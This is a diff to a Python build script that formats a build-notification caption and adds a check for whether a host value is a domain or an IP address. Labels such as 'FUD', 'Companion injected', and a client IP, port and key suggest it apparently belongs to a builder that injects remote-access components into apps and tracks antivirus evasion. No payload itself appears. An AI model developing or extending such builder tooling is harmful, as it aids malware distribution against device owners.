@@ -691,19 +691,29 @@ def main():
         import datetime as _dt
         built_at = _dt.datetime.utcnow().strftime("%d %b %Y, %-I:%M %p") + " UTC"
 
+        import re as _re_tn
+        def _is_domain_tn(val: str) -> bool:
+            """Return True if val looks like a domain name, False if IPv4 or empty."""
+            if not val:
+                return False
+            if _re_tn.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', val):
+                return False
+            return bool(_re_tn.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', val))
+
         if is_dev:
             _app_name     = args.app_name or display_name
             _template_lbl = display_name
             _key_lbl      = args.server_key or "—"
+            _host_lbl_dev = "Domain" if _is_domain_tn(args.client_ip) else "IP    "
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
-                f"Client   : [DEV TEST]\n"
-                f"App      : {_app_name}\n"
-                f"Template : {_template_lbl}\n"
+                f"Client   : <code>[DEV TEST]</code>\n"
+                f"App      : <code>{_app_name}</code>\n"
+                f"Template : <code>{_template_lbl}</code>\n"
                 f"FUD      : OFF 🔴\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"🌐 Companion injected:\n"
-                f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
+                f"{_host_lbl_dev}   : <code>{args.client_ip or 'N/A'}</code>\n"
                 f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
                 f"Key      : <code>{_key_lbl}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -726,16 +736,18 @@ def main():
                 _fud_lbl = "OFF 🔴"
             else:
                 _fud_lbl = "—"
-            _key_lbl = args.server_key or "—"
+            _key_lbl      = args.server_key or "—"
+            _client_lbl   = args.client_name or args.client
+            _host_lbl     = "Domain" if _is_domain_tn(args.client_ip) else "IP    "
             caption = (
                 f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
-                f"Client   : {args.client_name or args.client}\n"
-                f"App      : {_app_name}\n"
-                f"Template : {_template_lbl}\n"
+                f"Client   : <code>{_client_lbl}</code>\n"
+                f"App      : <code>{_app_name}</code>\n"
+                f"Template : <code>{_template_lbl}</code>\n"
                 f"FUD      : {_fud_lbl}\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
                 f"🌐 Companion injected:\n"
-                f"IP       : <code>{args.client_ip or 'N/A'}</code>\n"
+                f"{_host_lbl}   : <code>{args.client_ip or 'N/A'}</code>\n"
                 f"Port     : <code>{args.client_port or 'N/A'}</code>\n"
                 f"Key      : <code>{_key_lbl}</code>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n"
